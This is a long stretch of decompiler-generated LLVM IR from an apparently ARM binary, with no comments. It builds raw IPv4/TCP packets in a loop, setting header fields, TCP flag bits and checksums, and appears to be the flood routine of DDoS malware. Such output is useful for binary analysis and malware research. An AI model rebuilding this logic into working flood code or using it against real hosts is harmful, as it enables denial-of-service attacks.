  %v0_cf24 = load i32, i32* @r6, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_cf2c = urem i32 %v0_cf1c, 65536
  store i32 %v3_cf2c, i32* %r2.global-to-local, align 4
  %v3_cf30 = urem i32 %v0_cf20, 65536
  store i32 %v3_cf30, i32* %r3.global-to-local, align 4
  %v3_cf34 = urem i32 %v0_cf24, 65536
  store i32 %v3_cf34, i32* %ip.global-to-local, align 4
  %v0_cf38 = load i32, i32* @fp, align 4
  %v2_cf38 = icmp eq i32 %v0_cf38, 0
  store i1 %v2_cf38, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-40, align 4
  %tmp76 = icmp slt i32 %v0_cf38, 1
  br i1 %tmp76, label %dec_label_pc_d438, label %dec_label_pc_cf50

dec_label_pc_cf50:                                ; preds = %dec_label_pc_cf1c
  %v1_cf58 = add i32 %v6_ce94, 40
  %tmp77 = mul i32 %v1_cf58, 256
  %v1_cf6c = urem i32 %v0_cf20, 256
  %v1_cf70 = and i32 %tmp77, 65280
  %v3_cf74 = mul nuw nsw i32 %v1_cf6c, 256
  %v1_cf7c = urem i32 %v0_cf24, 256
  %tmp78 = udiv i32 %v0_cf24, 256
  %v3_cf80 = urem i32 %tmp78, 256
  %tmp79 = udiv i32 %v1_cf58, 256
  %tmp80 = udiv i32 %v0_cf20, 256
  %v4_cf88 = urem i32 %tmp80, 256
  %v5_cf88 = or i32 %v4_cf88, %v3_cf74
  store i32 %v5_cf88, i32* @sl, align 4
  %v4_cf8c = mul nuw nsw i32 %v1_cf7c, 256
  %v5_cf8c = or i32 %v4_cf8c, %v3_cf80
  store i32 %v5_cf8c, i32* @r6, align 4
  %tmp81 = udiv i32 %v0_cf1c, 256
  %v3_cf9c = urem i32 %tmp81, 256
  %v1_cfa0 = urem i32 %v0_cf1c, 256
  %tmp82 = mul i32 %v5_cdd0, 256
  %v1_cfa8 = and i32 %tmp82, 65280
  %v1_cfac = urem i32 %v6_ce04, 2
  %v1_cfb0 = urem i32 %v6_ce1c, 2
  %v1_cfb4 = urem i32 %v6_ce34, 2
  %tmp83 = udiv i32 %v5_cdd0, 256
  %v4_cfb8 = urem i32 %tmp83, 256
  %v5_cfb8 = or i32 %v4_cfb8, %v1_cfa8
  store i32 %v5_cfb8, i32* @r8, align 4
  %v1_cfd8 = urem i32 %v6_ce4c, 2
  %v1_cfdc = urem i32 %v6_ce64, 2
  %v1_cfe0 = urem i32 %v6_ce7c, 2
  %v1_cfe4 = urem i32 %v6_ce34, 256
  %v4_cfe8 = mul nuw nsw i32 %v1_cfa0, 256
  %v5_cfe8 = or i32 %v4_cfe8, %v3_cf9c
  store i32 %v5_cfe8, i32* @r5, align 4
  %v3_cffc26 = udiv i32 %v1_cf70, 256
  store i32 %v3_cffc26, i32* %r3.global-to-local, align 4
  store i32 %v1_cfa0, i32* %ip.global-to-local, align 4
  store i32 %v1_cf6c, i32* %r1.global-to-local, align 4
  store i32 %v1_cf7c, i32* %r2.global-to-local, align 4
  %v5_d018 = trunc i32 %v0_cf20 to i8
  store i32 0, i32* %r4.global-to-local, align 4
  %sext9 = mul i32 %v5_cd54, 16777216
  %v4_d074 = sdiv i32 %sext9, 16777216
  %sext10 = mul i32 %v0_cf1c, 16777216
  %v4_d080 = sdiv i32 %sext10, 16777216
  %sext11 = mul i32 %tmp79, 16777216
  %v4_d094 = sdiv i32 %sext11, 16777216
  %sext12 = mul i32 %v1_cf58, 16777216
  %v4_d098 = sdiv i32 %sext12, 16777216
  %tmp = sub nsw i32 0, %v1_cfac
  %v4_d0e8 = and i32 %tmp, 32
  %tmp94 = sub nsw i32 0, %v1_cfb0
  %v4_d0fc = and i32 %tmp94, 16
  %tmp95 = sub nsw i32 0, %v1_cfb4
  %v4_d110 = and i32 %tmp95, 8
  %tmp96 = sub nsw i32 0, %v1_cfd8
  %v4_d124 = and i32 %tmp96, 4
  %tmp97 = sub nsw i32 0, %v1_cfdc
  %v3_d138 = and i32 %tmp97, 2
  %sext13 = mul i32 %v0_cf24, 16777216
  %v7_d168 = sdiv i32 %sext13, 16777216
  %v1_d07c = trunc i32 %v4_d074 to i8
  %extract.t = trunc i32 %v4_d080 to i8
  %v3_d168 = sext i8 %v5_d018 to i32
  %v2_d18c = icmp eq i32 %v1_cfe4, 0
  br label %dec_label_pc_d024

dec_label_pc_d024:                                ; preds = %bb90, %dec_label_pc_cf50
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d030 = call i32* @calloc(i32 1510, i32 1)
  %v4_d030 = ptrtoint i32* %v2_d030 to i32
  store i32 %v4_cd00, i32* %ip.global-to-local, align 4
  %v2_d03c = load i32, i32* %r4.global-to-local, align 4
  %v5_d03c = mul i32 %v2_d03c, 4
  %v6_d03c = add i32 %v5_d03c, %v4_cd00
  %v7_d03c = inttoptr i32 %v6_d03c to i32*
  store i32 %v4_d030, i32* %v7_d03c, align 4
  %v3_d040 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d040, i32* %r3.global-to-local, align 4
  %v0_d044 = load i32, i32* %ip.global-to-local, align 4
  %v4_d044 = mul i32 %v3_d040, 4
  %v5_d044 = add i32 %v0_d044, %v4_d044
  %v6_d044 = inttoptr i32 %v5_d044 to i32*
  %v7_d044 = load i32, i32* %v6_d044, align 4
  store i32 %v7_d044, i32* @r7, align 4
  %v1_d048 = inttoptr i32 %v7_d044 to i8*
  %v2_d048 = load i8, i8* %v1_d048, align 1
  %tmp98 = urem i8 %v2_d048, 16
  %v1_d04c = zext i8 %tmp98 to i32
  %v1_d050 = or i32 %v1_d04c, 64
  store i32 %v1_d050, i32* %r2.global-to-local, align 4
  %v1_d054 = trunc i32 %v1_d050 to i8
  store i8 %v1_d054, i8* %v1_d048, align 1
  %v0_d058 = load i32, i32* @r7, align 4
  %v1_d058 = inttoptr i32 %v0_d058 to i8*
  %v2_d058 = load i8, i8* %v1_d058, align 1
  %v1_d05c = and i8 %v2_d058, -16
  %v1_d060 = or i8 %v1_d05c, 5
  store i32 %v1_cd80, i32* %r1.global-to-local, align 4
  store i8 %v1_d060, i8* %v1_d058, align 1
  %v2_d070 = load i32, i32* @r7, align 4
  %v3_d070 = add i32 %v2_d070, 1
  %v4_d070 = inttoptr i32 %v3_d070 to i8*
  store i8 %v5_cd38, i8* %v4_d070, align 1
  store i32 %v4_d074, i32* %r3.global-to-local, align 4
  %v0_d078 = load i32, i32* %r1.global-to-local, align 4
  %v2_d078 = icmp eq i32 %v0_d078, 0
  store i1 %v2_d078, i1* %cpsr_z.global-to-local, align 1
  %v2_d07c = load i32, i32* @r7, align 4
  %v3_d07c = add i32 %v2_d07c, 8
  %v4_d07c = inttoptr i32 %v3_d07c to i8*
  store i8 %v1_d07c, i8* %v4_d07c, align 1
  store i32 %v4_d080, i32* %r2.global-to-local, align 4
  %v0_d084 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d084, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_d024
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_d088 = load i32, i32* @r7, align 4
  %v4_d088 = add i32 %v3_d088, 6
  %v5_d088 = inttoptr i32 %v4_d088 to i8*
  store i8 64, i8* %v5_d088, align 1
  %v0_d090.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t27 = trunc i32 %v0_d090.pre to i8
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_d024, %bb
  %v0_d090.off0 = phi i8 [ %extract.t, %dec_label_pc_d024 ], [ %extract.t27, %bb ]
  store i32 6, i32* %r3.global-to-local, align 4
  %v2_d090 = load i32, i32* @r7, align 4
  %v3_d090 = add i32 %v2_d090, 5
  %v4_d090 = inttoptr i32 %v3_d090 to i8*
  store i8 %v0_d090.off0, i8* %v4_d090, align 1
  store i32 %v4_d094, i32* %ip.global-to-local, align 4
  store i32 %v4_d098, i32* %r1.global-to-local, align 4
  %v0_d09c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d09c, label %bb85, label %bb84

bb84:                                             ; preds = %.thread
  store i32 0, i32* %r2.global-to-local, align 4
  br label %bb85

bb85:                                             ; preds = %.thread, %bb84
  %v0_d0a0 = load i32, i32* %r3.global-to-local, align 4
  %v1_d0a0 = trunc i32 %v0_d0a0 to i8
  %v2_d0a0 = load i32, i32* @r7, align 4
  %v3_d0a0 = add i32 %v2_d0a0, 9
  %v4_d0a0 = inttoptr i32 %v3_d0a0 to i8*
  store i8 %v1_d0a0, i8* %v4_d0a0, align 1
  %v0_d0a4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d0a4, label %bb87, label %bb86

bb86:                                             ; preds = %bb85
  %v1_d0a4 = load i32, i32* %r2.global-to-local, align 4
  %v2_d0a4 = trunc i32 %v1_d0a4 to i8
  %v3_d0a4 = load i32, i32* @r7, align 4
  %v4_d0a4 = add i32 %v3_d0a4, 7
  %v5_d0a4 = inttoptr i32 %v4_d0a4 to i8*
  store i8 %v2_d0a4, i8* %v5_d0a4, align 1
  br label %bb87

bb87:                                             ; preds = %bb85, %bb86
  %v3_d0a8 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d0a8, i32* %r2.global-to-local, align 4
  %v0_d0ac = load i32, i32* %ip.global-to-local, align 4
  %v1_d0ac = trunc i32 %v0_d0ac to i8
  %v2_d0ac = load i32, i32* @r7, align 4
  %v3_d0ac = add i32 %v2_d0ac, 2
  %v4_d0ac = inttoptr i32 %v3_d0ac to i8*
  store i8 %v1_d0ac, i8* %v4_d0ac, align 1
  store i32 %v6_ced0, i32* %ip.global-to-local, align 4
  %v0_d0b4 = load i32, i32* %r2.global-to-local, align 4
  %v3_d0b4 = mul i32 %v0_d0b4, 32
  store i32 %v3_d0b4, i32* %r3.global-to-local, align 4
  %v1_d0b8 = load i32, i32* @r7, align 4
  %v2_d0b8 = add i32 %v1_d0b8, 12
  %v3_d0b8 = inttoptr i32 %v2_d0b8 to i32*
  store i32 %v6_ced0, i32* %v3_d0b8, align 4
  %v0_d0bc = load i32, i32* %r3.global-to-local, align 4
  %v1_d0bc = load i32, i32* %r2.global-to-local, align 4
  %tmp99 = mul i32 %v1_d0bc, -8
  %v5_d0bc = add i32 %v0_d0bc, %tmp99
  %v1_d0c0 = load i32, i32* @sb, align 4
  %v2_d0c0 = add i32 %v1_d0c0, %v5_d0bc
  store i32 %v2_d0c0, i32* %r3.global-to-local, align 4
  %v1_d0c4 = add i32 %v2_d0c0, 16
  %v2_d0c4 = inttoptr i32 %v1_d0c4 to i32*
  %v3_d0c4 = load i32, i32* %v2_d0c4, align 4
  store i32 %v3_d0c4, i32* %r2.global-to-local, align 4
  %v0_d0c8 = load i32, i32* %r1.global-to-local, align 4
  %v1_d0c8 = trunc i32 %v0_d0c8 to i8
  %v2_d0c8 = load i32, i32* @r7, align 4
  %v3_d0c8 = add i32 %v2_d0c8, 3
  %v4_d0c8 = inttoptr i32 %v3_d0c8 to i8*
  store i8 %v1_d0c8, i8* %v4_d0c8, align 1
  %v0_d0cc = load i32, i32* @r5, align 4
  %v1_d0cc = trunc i32 %v0_d0cc to i8
  %v2_d0cc = load i32, i32* @r7, align 4
  %v3_d0cc = add i32 %v2_d0cc, 4
  %v4_d0cc = inttoptr i32 %v3_d0cc to i8*
  store i8 %v1_d0cc, i8* %v4_d0cc, align 1
  %v0_d0d0 = load i32, i32* %r2.global-to-local, align 4
  %v1_d0d0 = load i32, i32* @r7, align 4
  %v2_d0d0 = add i32 %v1_d0d0, 16
  %v3_d0d0 = inttoptr i32 %v2_d0d0 to i32*
  store i32 %v0_d0d0, i32* %v3_d0d0, align 4
  %v0_d0d4 = load i32, i32* @sl, align 4
  %v1_d0d4 = trunc i32 %v0_d0d4 to i8
  %v2_d0d4 = load i32, i32* @r7, align 4
  %v3_d0d4 = add i32 %v2_d0d4, 20
  %v4_d0d4 = inttoptr i32 %v3_d0d4 to i8*
  store i8 %v1_d0d4, i8* %v4_d0d4, align 1
  %v0_d0d8 = load i32, i32* @r7, align 4
  %v1_d0d8 = add i32 %v0_d0d8, 20
  store i32 %v1_d0d8, i32* @r4, align 4
  %v1_d0dc = add i32 %v0_d0d8, 33
  %v2_d0dc = inttoptr i32 %v1_d0dc to i8*
  %v3_d0dc = load i8, i8* %v2_d0dc, align 1
  %v4_d0dc = zext i8 %v3_d0dc to i32
  store i32 %v1_cfac, i32* %r1.global-to-local, align 4
  %v1_d0e4 = and i32 %v4_d0dc, 223
  %v5_d0e8 = or i32 %v1_d0e4, %v4_d0e8
  store i32 %v5_d0e8, i32* %r3.global-to-local, align 4
  %v1_d0ec = trunc i32 %v5_d0e8 to i8
  store i8 %v1_d0ec, i8* %v2_d0dc, align 1
  %v0_d0f0 = load i32, i32* @r4, align 4
  %v1_d0f0 = add i32 %v0_d0f0, 13
  %v2_d0f0 = inttoptr i32 %v1_d0f0 to i8*
  %v3_d0f0 = load i8, i8* %v2_d0f0, align 1
  %v4_d0f0 = zext i8 %v3_d0f0 to i32
  store i32 %v1_cfb0, i32* %r3.global-to-local, align 4
  %v1_d0f8 = and i32 %v4_d0f0, 239
  %v5_d0fc = or i32 %v1_d0f8, %v4_d0fc
  store i32 %v5_d0fc, i32* %r2.global-to-local, align 4
  %v1_d100 = trunc i32 %v5_d0fc to i8
  store i8 %v1_d100, i8* %v2_d0f0, align 1
  %v0_d104 = load i32, i32* @r4, align 4
  %v1_d104 = add i32 %v0_d104, 13
  %v2_d104 = inttoptr i32 %v1_d104 to i8*
  %v3_d104 = load i8, i8* %v2_d104, align 1
  %v4_d104 = zext i8 %v3_d104 to i32
  store i32 %v1_cfb4, i32* %ip.global-to-local, align 4
  %v1_d10c = and i32 %v4_d104, 247
  %v5_d110 = or i32 %v1_d10c, %v4_d110
  store i32 %v5_d110, i32* %r3.global-to-local, align 4
  %v1_d114 = trunc i32 %v5_d110 to i8
  store i8 %v1_d114, i8* %v2_d104, align 1
  %v0_d118 = load i32, i32* @r4, align 4
  %v1_d118 = add i32 %v0_d118, 13
  %v2_d118 = inttoptr i32 %v1_d118 to i8*
  %v3_d118 = load i8, i8* %v2_d118, align 1
  %v4_d118 = zext i8 %v3_d118 to i32
  store i32 %v1_cfd8, i32* %r1.global-to-local, align 4
  %v1_d120 = and i32 %v4_d118, 251
  %v5_d124 = or i32 %v1_d120, %v4_d124
  store i32 %v5_d124, i32* %r2.global-to-local, align 4
  %v1_d128 = trunc i32 %v5_d124 to i8
  store i8 %v1_d128, i8* %v2_d118, align 1
  %v0_d12c = load i32, i32* @r4, align 4
  %v1_d12c = add i32 %v0_d12c, 13
  %v2_d12c = inttoptr i32 %v1_d12c to i8*
  %v3_d12c = load i8, i8* %v2_d12c, align 1
  %v4_d12c = zext i8 %v3_d12c to i32
  store i32 %v1_cfdc, i32* %r2.global-to-local, align 4
  %v1_d134 = and i32 %v4_d12c, 253
  %v4_d138 = or i32 %v1_d134, %v3_d138
  store i32 %v4_d138, i32* %r3.global-to-local, align 4
  %v1_d13c = trunc i32 %v4_d138 to i8
  store i8 %v1_d13c, i8* %v2_d12c, align 1
  %v0_d140 = load i32, i32* @r4, align 4
  %v1_d140 = add i32 %v0_d140, 12
  %v2_d140 = inttoptr i32 %v1_d140 to i8*
  %v3_d140 = load i8, i8* %v2_d140, align 1
  %v4_d140 = zext i8 %v3_d140 to i32
  store i32 %v4_d140, i32* %r2.global-to-local, align 4
  %v1_d144 = add i32 %v0_d140, 13
  %v2_d144 = inttoptr i32 %v1_d144 to i8*
  %v3_d144 = load i8, i8* %v2_d144, align 1
  %v4_d144 = zext i8 %v3_d144 to i32
  store i32 %v1_cfe0, i32* %ip.global-to-local, align 4
  %tmp100 = urem i8 %v3_d140, 16
  %v1_d14c = zext i8 %tmp100 to i32
  %v1_d150 = and i32 %v4_d144, 254
  %v2_d154 = or i32 %v1_d150, %v1_cfe0
  store i32 %v2_d154, i32* %r3.global-to-local, align 4
  %v1_d158 = or i32 %v1_d14c, 80
  store i32 %v1_d158, i32* %r2.global-to-local, align 4
  %v1_d15c = trunc i32 %v2_d154 to i8
  store i8 %v1_d15c, i8* %v2_d144, align 1
  %v0_d160 = load i32, i32* %r2.global-to-local, align 4
  %v1_d160 = trunc i32 %v0_d160 to i8
  %v2_d160 = load i32, i32* @r4, align 4
  %v3_d160 = add i32 %v2_d160, 12
  %v4_d160 = inttoptr i32 %v3_d160 to i8*
  store i8 %v1_d160, i8* %v4_d160, align 1
  store i32 %v3_d168, i32* %r1.global-to-local, align 4
  store i32 %v7_d168, i32* %r2.global-to-local, align 4
  %v2_d16c = load i32, i32* @r4, align 4
  %v3_d16c = add i32 %v2_d16c, 1
  %v4_d16c = inttoptr i32 %v3_d16c to i8*
  store i8 %v5_d018, i8* %v4_d16c, align 1
  %v0_d170 = load i32, i32* %r2.global-to-local, align 4
  %v1_d170 = trunc i32 %v0_d170 to i8
  %v2_d170 = load i32, i32* @r4, align 4
  %v3_d170 = add i32 %v2_d170, 3
  %v4_d170 = inttoptr i32 %v3_d170 to i8*
  store i8 %v1_d170, i8* %v4_d170, align 1
  %v0_d174 = load i32, i32* @r6, align 4
  %v1_d174 = trunc i32 %v0_d174 to i8
  %v2_d174 = load i32, i32* @r4, align 4
  %v3_d174 = add i32 %v2_d174, 2
  %v4_d174 = inttoptr i32 %v3_d174 to i8*
  store i8 %v1_d174, i8* %v4_d174, align 1
  %v0_d178 = load i32, i32* @r8, align 4
  %v1_d178 = load i32, i32* @r4, align 4
  %v2_d178 = add i32 %v1_d178, 4
  %v3_d178 = inttoptr i32 %v2_d178 to i32*
  store i32 %v0_d178, i32* %v3_d178, align 4
  %v0_d17c = call i32 @function_10b68()
  store i32 %v1_cfe4, i32* %ip.global-to-local, align 4
  %sext = mul i32 %v0_d17c, 16777216
  %v1_d184 = sdiv i32 %sext, 16777216
  store i32 %v1_d184, i32* %r2.global-to-local, align 4
  %v3_d188 = ashr i32 %sext, 31
  store i32 %v3_d188, i32* %r3.global-to-local, align 4
  store i1 %v2_d18c, i1* %cpsr_z.global-to-local, align 1
  %v1_d190 = trunc i32 %v3_d188 to i8
  %v2_d190 = load i32, i32* @r4, align 4
  %v3_d190 = add i32 %v2_d190, 15
  %v4_d190 = inttoptr i32 %v3_d190 to i8*
  store i8 %v1_d190, i8* %v4_d190, align 1
  %v0_d194 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v2_d1a0.pre = load i32, i32* @r4, align 4
  br i1 %v0_d194, label %.thread14, label %bb88

bb88:                                             ; preds = %bb87
  %v2_d194 = add i32 %v2_d1a0.pre, 13
  %v3_d194 = inttoptr i32 %v2_d194 to i8*
  %v4_d194 = load i8, i8* %v3_d194, align 1
  %v5_d194 = zext i8 %v4_d194 to i32
  %v2_d198 = or i32 %v5_d194, 8
  store i32 %v2_d198, i32* %r3.global-to-local, align 4
  br label %.thread14

.thread14:                                        ; preds = %bb87, %bb88
  store i32 %v6_ce94, i32* @r1, align 4
  %v0_d1a0 = load i32, i32* %r2.global-to-local, align 4
  %v1_d1a0 = trunc i32 %v0_d1a0 to i8
  %v3_d1a0 = add i32 %v2_d1a0.pre, 14
  %v4_d1a0 = inttoptr i32 %v3_d1a0 to i8*
  store i8 %v1_d1a0, i8* %v4_d1a0, align 1
  %v0_d1a4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d1a4, label %bb90, label %bb89

bb89:                                             ; preds = %.thread14
  %v1_d1a4 = load i32, i32* %r3.global-to-local, align 4
  %v2_d1a4 = trunc i32 %v1_d1a4 to i8
  %v3_d1a4 = load i32, i32* @r4, align 4
  %v4_d1a4 = add i32 %v3_d1a4, 13
  %v5_d1a4 = inttoptr i32 %v4_d1a4 to i8*
  store i8 %v2_d1a4, i8* %v5_d1a4, align 1
  br label %bb90

bb90:                                             ; preds = %.thread14, %bb89
  %v0_d1a8 = load i32, i32* @r7, align 4
  %v1_d1a8 = add i32 %v0_d1a8, 40
  %v1_d1ac = inttoptr i32 %v1_d1a8 to i8*
  %v2_d1ac = call i32 @function_10d44(i8* %v1_d1ac)
  %v3_d1b0 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d1b0, i32* %r3.global-to-local, align 4
  %v1_d1b4 = add i32 %v3_d1b0, 1
  store i32 %v1_d1b4, i32* %r4.global-to-local, align 4
  %v0_d1b8 = load i32, i32* @fp, align 4
  %v9_d1b8 = icmp eq i32 %v0_d1b8, %v1_d1b4
  store i1 %v9_d1b8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_d1b4, i32* %stack_var_-40, align 4
  %v8_d1c0 = icmp sgt i32 %v0_d1b8, %v1_d1b4
  br i1 %v8_d1c0, label %dec_label_pc_d024, label %dec_label_pc_d1c4

dec_label_pc_d1c4:                                ; preds = %bb90
  store i32 %v6_ce94, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_d1cc.preheader

dec_label_pc_d1cc.preheader:                      ; preds = %dec_label_pc_d1c4, %dec_label_pc_d438
  %v0_d1cc18 = phi i32 [ %v0_d1b8, %dec_label_pc_d1c4 ], [ %v0_cf38, %dec_label_pc_d438 ]
  %stack_var_-168.0.ph = phi i32 [ %v1_cf58, %dec_label_pc_d1c4 ], [ %v1_d440, %dec_label_pc_d438 ]
  %storemerge = add i32 %v6_ce94, 20
  store i32 %storemerge, i32* @r8, align 4
  %v3_d384 = icmp eq i32 %v6_ced0, -1
  %v8_d384 = icmp eq i32 %v6_ced0, -1
  %v3_d3a0 = icmp eq i32 %v3_cf2c, 65535
  %v2_d41c = icmp eq i32 %v1_cebc, 0
  br label %dec_label_pc_d1cc

dec_label_pc_d1cc:                                ; preds = %dec_label_pc_d274, %dec_label_pc_d1cc.preheader
  %v0_d1cc = phi i32 [ %v0_d1cc18, %dec_label_pc_d1cc.preheader ], [ %v0_d308, %dec_label_pc_d274 ]
  %v2_d1cc = icmp eq i32 %v0_d1cc, 0
  store i1 %v2_d1cc, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r1.global-to-local, align 4
  %tmp91 = icmp slt i32 %v0_d1cc, 1
  br label %dec_label_pc_d1d4

dec_label_pc_d1d4:                                ; preds = %dec_label_pc_d1d4, %dec_label_pc_d1cc
  br i1 %tmp91, label %dec_label_pc_d1d4, label %dec_label_pc_d1d8

dec_label_pc_d1d8:                                ; preds = %dec_label_pc_d1d4
  %v0_d1d8 = load i32, i32* @r8, align 4
  %v3_d1d8 = mul i32 %v0_d1d8, 65536
  store i32 %v3_d1d8, i32* %r2.global-to-local, align 4
  %tmp92 = mul i32 %v0_d1d8, 256
  %v1_d1e0 = and i32 %tmp92, 65280
  store i32 %v1_d1e0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-40, align 4
  %tmp93 = udiv i32 %v0_d1d8, 256
  %v4_d1ec = urem i32 %tmp93, 256
  %v5_d1ec = or i32 %v4_d1ec, %v1_d1e0
  store i32 %v5_d1ec, i32* @sl, align 4
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_d1f4

dec_label_pc_d1f4:                                ; preds = %dec_label_pc_d274, %dec_label_pc_d1d8
  %v1_d208 = phi i32 [ %v1_d304, %dec_label_pc_d274 ], [ 0, %dec_label_pc_d1d8 ]
  %v5_d1f8 = mul i32 %v1_d208, 24
  %v1_d1fc = load i32, i32* @sb, align 4
  %v2_d1fc = add i32 %v1_d1fc, %v5_d1f8
  store i32 %v2_d1fc, i32* %r3.global-to-local, align 4
  store i32 %v4_cd00, i32* %ip.global-to-local, align 4
  %v1_d204 = add i32 %v2_d1fc, 20
  %v2_d204 = inttoptr i32 %v1_d204 to i8*
  %v3_d204 = load i8, i8* %v2_d204, align 1
  %v4_d204 = zext i8 %v3_d204 to i32
  store i32 %v4_d204, i32* %r2.global-to-local, align 4
  %v4_d208 = mul i32 %v1_d208, 4
  %v5_d208 = add i32 %v4_d208, %v4_cd00
  %v6_d208 = inttoptr i32 %v5_d208 to i32*
  %v7_d208 = load i32, i32* %v6_d208, align 4
  store i32 %v7_d208, i32* @r5, align 4
  %v7_d20c = icmp eq i8 %v3_d204, 31
  store i1 %v7_d20c, i1* %cpsr_z.global-to-local, align 1
  %v1_d210 = add i32 %v7_d208, 20
  store i32 %v1_d210, i32* @r6, align 4
  %tmp101 = icmp ult i8 %v3_d204, 32
  br i1 %tmp101, label %dec_label_pc_d328, label %dec_label_pc_d218

dec_label_pc_d218:                                ; preds = %dec_label_pc_d1f4
  store i32 %v6_ced0, i32* %r1.global-to-local, align 4
  store i1 %v8_d384, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_d384, label %dec_label_pc_d390, label %dec_label_pc_d224

dec_label_pc_d224:                                ; preds = %dec_label_pc_d328, %dec_label_pc_d218
  store i32 %v3_cf2c, i32* %r2.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_d3a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_d3a0, label %dec_label_pc_d3ac, label %dec_label_pc_d238

dec_label_pc_d238:                                ; preds = %dec_label_pc_d390.dec_label_pc_d238_crit_edge, %dec_label_pc_d224
  %v1_d23c = phi i32 [ %v1_d23c.pre, %dec_label_pc_d390.dec_label_pc_d238_crit_edge ], [ 65535, %dec_label_pc_d224 ]
  store i32 %v3_cf30, i32* %r3.global-to-local, align 4
  %v9_d23c = icmp eq i32 %v3_cf30, %v1_d23c
  store i1 %v9_d23c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d23c, label %dec_label_pc_d3c8, label %dec_label_pc_d244

dec_label_pc_d244:                                ; preds = %dec_label_pc_d3ac.dec_label_pc_d244_crit_edge, %dec_label_pc_d238
  %v1_d248 = phi i32 [ %v1_d248.pre, %dec_label_pc_d3ac.dec_label_pc_d244_crit_edge ], [ %v1_d23c, %dec_label_pc_d238 ]
  store i32 %v3_cf34, i32* %ip.global-to-local, align 4
  %v9_d248 = icmp eq i32 %v3_cf34, %v1_d248
  store i1 %v9_d248, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d248, label %dec_label_pc_d3e4, label %dec_label_pc_d250

dec_label_pc_d250:                                ; preds = %dec_label_pc_d3c8.dec_label_pc_d250_crit_edge, %dec_label_pc_d244
  %v1_d254 = phi i32 [ %v1_d254.pre, %dec_label_pc_d3c8.dec_label_pc_d250_crit_edge ], [ %v1_d248, %dec_label_pc_d244 ]
  store i32 %v5_cdd0, i32* %r1.global-to-local, align 4
  %v9_d254 = icmp eq i32 %v5_cdd0, %v1_d254
  store i1 %v9_d254, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d254, label %dec_label_pc_d400, label %dec_label_pc_d25c

dec_label_pc_d25c:                                ; preds = %dec_label_pc_d3e4.dec_label_pc_d25c_crit_edge, %dec_label_pc_d250
  %v1_d260 = phi i32 [ %v1_d260.pre, %dec_label_pc_d3e4.dec_label_pc_d25c_crit_edge ], [ %v1_d254, %dec_label_pc_d250 ]
  store i32 %v6_cdec, i32* %r2.global-to-local, align 4
  %v9_d260 = icmp eq i32 %v6_cdec, %v1_d260
  store i1 %v9_d260, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d260, label %dec_label_pc_d414, label %dec_label_pc_d268

dec_label_pc_d268:                                ; preds = %dec_label_pc_d400, %dec_label_pc_d25c
  store i32 %v1_cebc, i32* %r3.global-to-local, align 4
  store i1 %v2_d41c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d41c, label %dec_label_pc_d274, label %dec_label_pc_d428

dec_label_pc_d274:                                ; preds = %dec_label_pc_d268, %dec_label_pc_d414, %dec_label_pc_d428
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_d278 = load i32, i32* @r7, align 4
  %v1_d278 = trunc i32 %v0_d278 to i8
  %v2_d278 = load i32, i32* @r5, align 4
  %v3_d278 = add i32 %v2_d278, 10
  %v4_d278 = inttoptr i32 %v3_d278 to i8*
  store i8 %v1_d278, i8* %v4_d278, align 1
  %v0_d27c = load i32, i32* @r7, align 4
  %v1_d27c = trunc i32 %v0_d27c to i8
  %v2_d27c = load i32, i32* @r5, align 4
  %v3_d27c = add i32 %v2_d27c, 11
  %v4_d27c = inttoptr i32 %v3_d27c to i8*
  store i8 %v1_d27c, i8* %v4_d27c, align 1
  %v0_d280 = load i32, i32* @r5, align 4
  store i32 %v0_d280, i32* @r0, align 4
  %v2_d284 = call i32 @function_f17c(i32 %v0_d280, i32 20)
  %v3_d284 = trunc i32 %v2_d284 to i8
  %v4_d28829 = udiv i32 %v2_d284, 256
  %v1_d28c = trunc i32 %v4_d28829 to i8
  %v2_d28c = load i32, i32* @r5, align 4
  %v3_d28c = add i32 %v2_d28c, 11
  %v4_d28c = inttoptr i32 %v3_d28c to i8*
  store i8 %v1_d28c, i8* %v4_d28c, align 1
  %v3_d290 = load i32, i32* @r5, align 4
  %v4_d290 = add i32 %v3_d290, 10
  %v5_d290 = inttoptr i32 %v4_d290 to i8*
  store i8 %v3_d284, i8* %v5_d290, align 1
  %v0_d294 = load i32, i32* @r6, align 4
  store i32 %v0_d294, i32* @r1, align 4
  %v0_d298 = load i32, i32* @sl, align 4
  store i32 %v0_d298, i32* %r2.global-to-local, align 4
  %v0_d29c = load i32, i32* @r8, align 4
  store i32 %v0_d29c, i32* %r3.global-to-local, align 4
  %v0_d2a0 = load i32, i32* @r7, align 4
  %v1_d2a0 = trunc i32 %v0_d2a0 to i8
  %v3_d2a0 = add i32 %v0_d294, 16
  %v4_d2a0 = inttoptr i32 %v3_d2a0 to i8*
  store i8 %v1_d2a0, i8* %v4_d2a0, align 1
  %v0_d2a4 = load i32, i32* @r7, align 4
  %v1_d2a4 = trunc i32 %v0_d2a4 to i8
  %v2_d2a4 = load i32, i32* @r6, align 4
